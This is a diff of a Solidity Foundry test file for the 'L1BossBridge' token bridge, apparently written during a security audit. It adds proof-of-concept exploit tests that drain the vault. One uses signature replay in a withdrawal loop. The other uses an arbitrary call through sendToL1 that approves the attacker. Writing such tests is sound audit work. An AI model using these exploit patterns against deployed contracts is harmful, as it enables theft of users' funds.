@@ -17,6 +17,7 @@ contract L1BossBridgeTest is Test {
     address user = makeAddr("user");
     address userInL2 = makeAddr("userInL2");
     Account operator = makeAccount("operator");
+    
 
     L1Token token;
     L1BossBridge tokenBridge;
@@ -243,7 +244,6 @@ contract L1BossBridgeTest is Test {
     }
 
     function testAnyoneCanTranferFromVault() public {
-
         address attacker = makeAddr("attacker");
         uint256 amount = 500 ether;
         deal(address(token),address(vault),amount);
@@ -252,6 +252,80 @@ contract L1BossBridgeTest is Test {
         tokenBridge.depositTokensToL2(address(vault), attacker, amount);
 
     }
+
+
+    // function testSignatureReplayAttack() public {
+    //     address attacker = makeAddr("attacker");
+    //     uint256 vaultInitialbalance = 1000e18;
+    //     uint256 attackerInitialbalance = 100e18;
+    //     deal(address(token),address(attacker),attackerInitialbalance);
+    //     deal(address(token),address(vault),vaultInitialbalance);
+    //     vm.startPrank(attacker);
+    //     token.approve(address(tokenBridge),type(uint256).max);
+    //     tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialbalance);
+    //     // user wants to withdraw
+    //     bytes memory message = abi.encode(address(token),0, abi.encodeCall(IERC20.transferFrom,(address(vault),attacker,100e18)));
+    //     (uint8 v,bytes32 r,bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    //     while(token.balanceOf(address(vault)) > 0){
+    //         tokenBridge.withdrawTokensToL1(attacker, attackerInitialbalance, v, r, s);
+    //     }
+    //     vm.stopPrank();
+    //     assertEq(token.balanceOf(address(vault)),0);
+    //     assertEq(token.balanceOf(address(attacker)), attackerInitialbalance + vaultInitialbalance);
+    // }
+
+
+
+    function testSignatureReplayAttack() public {
+        Account memory boss = makeAccount("boss");
+        vm.prank(tokenBridge.owner());
+        tokenBridge.setSigner(boss.addr, true);
+        address attacker = makeAddr("attacker");
+        deal(address(token),attacker,100e18);
+        deal(address(token),address(vault),1000e18);
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge),type(uint256).max);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(attacker, attacker, 100e18);
+        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
+        bytes memory message = abi.encode(address(token),0, abi.encodeWithSelector(IERC20.transferFrom.selector,address(vault),attacker,100e18));
+        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, 100e18, v, r, s);
+        }
+        assertEq(token.balanceOf(address(vault)),0);
+        assertEq(token.balanceOf(attacker),1100e18);
+        vm.stopPrank();
+    }
+
+
+
+
+
+
+
+   
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        Account memory boss = makeAccount("boss");
+        vm.prank(tokenBridge.owner());
+        tokenBridge.setSigner(boss.addr, true);
+        address attacker = makeAddr("attacker");
+        deal(address(token),attacker,100e18);
+        deal(address(token),address(vault),1000e18);
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge),type(uint256).max);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(attacker, attacker, 100e18);
+        tokenBridge.depositTokensToL2(attacker, attacker, 100e18);
+        bytes memory message = abi.encode(address(vault),0, abi.encodeCall(L1Vault.approveTo,(address(attacker),type(uint256).max)));
+        (uint8 v,bytes32 r,bytes32 s) = vm.sign(boss.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        tokenBridge.sendToL1(v, r, s, message);
+        token.transferFrom(address(vault),attacker,token.balanceOf(address(vault)));
+        assertEq(token.balanceOf(attacker),1100e18);
+        vm.stopPrank();
+    }
+
+
 
 
 }
